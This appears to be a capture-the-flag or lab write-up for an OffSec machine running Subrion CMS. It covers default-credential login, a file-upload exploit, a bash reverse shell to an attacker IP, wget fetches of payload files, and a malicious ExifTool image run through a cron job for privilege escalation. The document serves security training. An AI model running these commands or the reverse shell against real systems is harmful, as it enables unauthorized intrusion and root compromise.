
# 80

Found a webpage run on subrion cms![](attachment/14588aa3c80aa047fec95fef97b3f96e.png)\
Found robots.txt
![](attachment/60dca9c1a6334efafbb3d85cfdfe71b0.png)

Found login page with version disclosure:
![](attachment/11a1f3530d98613de9b0afb3b8aa0155.png)

Trying `admin : admin`:
![](attachment/825ed085b1b1336b9fd74112aca3a9c0.png)
We are logged in.

Now trying a file upload vulnerability https://www.exploit-db.com/exploits/49876:
```bash 
python3 subrionfileup.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```
![](attachment/3b168731940d884ba0416634edf5b7f3.png)
![](attachment/a9fbd2595f5bc0c4cc4b676c2b60d519.png)
Now transfering shell.sh:
```
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.167/8000 0>&1
```

and executing it:
![](attachment/14883a31727b13d5133c6ff282ec2537.png)

We get a full a TTY:
![](attachment/74ec8bc0eb3b565e420c5a304d87b393.png)

Found some potential credentials:
![](attachment/34c9c56d45faeb5e9289cc859443bb75.png)
Found some info:
![](attachment/6921c6d36b58823a1c6b91b540fb81a5.png)

Running linpeas found cronjob:
![](attachment/0067abc56945d20942654f6728f09002.png)
![](attachment/71f5603a5c5f80c31c0fef2cd0bd4ef3.png)
Now checking exiftool version:
![](attachment/6083e73440bd0a0cdd3b63169ab36592.png)
https://github.com/OneSecCyber/JPEG_RCE/tree/main
ExifTool 7.44 to 12.23 are vulnerable.

Our exiftool version is vulnerable to this exploit.
Using the exiftool exploit
Transfer the required files:
```
wget http://192.168.45.167/eval.config
wget http://192.168.45.167/runme.jpg
```

create a malicious image:
```
exiftool -config eval.config runme.jpg -eval='system("bash /var/www/html/subrion/uploads/shell.sh")'
```
in `/var/www/html/subrion/uploads`

# Lesson Learnt

Just because a script runs in cron and uses a specific binary it might not be tricking the script and might be about the version too